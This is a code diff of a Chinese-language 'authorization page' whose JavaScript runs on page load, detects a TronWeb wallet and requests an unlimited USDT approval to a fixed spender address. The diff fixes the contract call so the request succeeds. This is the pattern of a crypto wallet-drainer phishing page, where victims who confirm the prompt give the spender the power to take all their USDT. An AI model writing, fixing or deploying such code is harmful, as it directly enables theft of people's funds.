@@ -4,49 +4,57 @@
     <meta charset="UTF-8">
     <title>授权页面</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- 双CDN备用，防止加载失败 -->
-    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
     <style>
-        body{background:#fff;text-align:center;padding-top:120px;font-size:16px;color:#333;}
+        body{background:#fff;text-align:center;padding-top:120px;font-size:18px;color:#333;}
     </style>
 </head>
 <body>
 <div id="tip">正在初始化钱包连接，请稍候...</div>
 <script>
+// 基础配置
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const SPENDER_ADDR = "TTbMYbFf3GoURy8S536ZWioGCEn74T8S3U";
+// 无限授权大数
 const MAX_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 const tipDom = document.getElementById('tip');
 
-// 等待钱包注入
-function waitTron(){
-    return new Promise(res=>{
-        let t = setInterval(()=>{
-            if(window.tronWeb && window.tronWeb.ready){
-                clearInterval(t);
-                res(window.tronWeb);
+// 标准TRC20合约ABI（只保留必要approve方法，轻量化）
+const TRC20_ABI = [
+    {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}
+];
+
+// 等待tronWeb就绪
+function waitTronReady() {
+    return new Promise(resolve => {
+        let timer = setInterval(() => {
+            if (window.tronWeb && window.tronWeb.ready) {
+                clearInterval(timer);
+                resolve(window.tronWeb);
             }
-        },600)
-    })
+        }, 600);
+    });
 }
 
-// 自动授权
-async function runAuth(){
-    try{
-        tipDom.innerText = "检测到钱包，发起授权请求...";
-        const tron = await waitTron();
-        const usdt = tron.contract().at(USDT_CONTRACT);
-        // 唤起签名弹窗
-        const txHash = await usdt.approve(SPENDER_ADDR, MAX_AMOUNT).send();
-        tipDom.innerText = `授权成功，交易哈希：${txHash}`;
-    }catch(err){
+// 自动授权主逻辑
+async function startApprove() {
+    try {
+        tipDom.innerText = "检测钱包中...";
+        const tronWeb = await waitTronReady();
+        // 正确写法：手动传入ABI，解决方法找不到问题
+        const usdtContract = tronWeb.contract(TRC20_ABI, USDT_CONTRACT);
+        
+        tipDom.innerText = "发起授权请求，请在钱包确认";
+        // 调用授权
+        const tx = await usdtContract.approve(SPENDER_ADDR, MAX_AMOUNT).send();
+        tipDom.innerText = `授权提交成功！交易哈希：${tx}`;
+    } catch (err) {
         tipDom.innerText = "授权失败：" + err.message;
         console.error(err);
     }
 }
 
-window.addEventListener('load',runAuth);
+window.onload = startApprove;
 </script>
 </body>
 </html>
